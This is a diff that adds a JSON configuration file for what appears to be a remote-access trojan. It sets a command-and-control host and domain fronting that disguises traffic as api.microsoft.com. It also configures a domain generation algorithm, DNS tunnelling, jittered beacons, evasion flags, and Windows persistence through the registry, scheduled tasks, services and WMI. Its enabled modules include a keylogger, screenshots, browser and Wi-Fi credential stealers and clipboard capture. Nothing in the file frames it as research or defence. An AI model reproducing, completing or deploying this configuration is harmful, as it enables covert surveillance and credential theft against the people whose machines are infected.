@@ -1,0 +1,97 @@
+{
+  "c2_host": "garden-helper.fi",
+  "c2_port": 443,
+  "c2_protocol": "https",
+  "encryption_key": "CHANGE_THIS_TO_RANDOM_64_CHAR_STRING_IN_PRODUCTION",
+  "universal_c2": {
+    "enabled": true,
+    "channels": [
+      {
+        "type": "https_fronting",
+        "host": "cdn.cloudflare.net",
+        "actual_host": "api.microsoft.com",
+        "port": 443,
+        "path": "/update/check",
+        "priority": 1
+      },
+      {
+        "type": "https_direct",
+        "host": "DGA_GENERATED",
+        "port": 443,
+        "path": "/api/v1/beacon",
+        "priority": 2
+      },
+      {
+        "type": "dns_tunnel",
+        "domain": "DGA_GENERATED",
+        "nameserver": "8.8.8.8",
+        "query_type": "TXT",
+        "priority": 3
+      }
+    ],
+    "max_fails": 5,
+    "rotate_on_fail": true
+  },
+  "dga": {
+    "seed": "aether_universal_class_project_retro",
+    "word_list": [
+      "cdn",
+      "api",
+      "update",
+      "service",
+      "cloud",
+      "storage",
+      "content",
+      "delivery"
+    ],
+    "tlds": [
+      ".com",
+      ".net",
+      ".org",
+      ".info",
+      ".io"
+    ],
+    "rotation_interval": 3600,
+    "pregen_count": 10
+  },
+  "beacon": {
+    "interval": 30,
+    "jitter": 5,
+    "adaptive": true,
+    "deep_sleep_after_fails": 5,
+    "deep_sleep_duration": 3600
+  },
+  "evasion": {
+    "tls_fingerprinting": true,
+    "domain_fronting": true,
+    "dns_obfuscation": true,
+    "randomize_user_agent": true,
+    "jitter_beacon": true
+  },
+  "persistence_methods": [
+    "registry",
+    "scheduled_task",
+    "service",
+    "wmi"
+  ],
+  "modules": {
+    "enable_keylogger": true,
+    "enable_screenshot": true,
+    "enable_webcam": false,
+    "enable_audio": false,
+    "enable_browser_stealer": true,
+    "enable_wifi_stealer": true,
+    "enable_clipboard": true,
+    "safe_mode": true
+  },
+  "ai": {
+    "enabled": true,
+    "learning_rate": 0.01,
+    "adapt_beacon_interval": true,
+    "evade_based_on_patterns": true
+  },
+  "c2": {
+    "primary_host": "localhost",
+    "primary_port": 443
+  }
+}
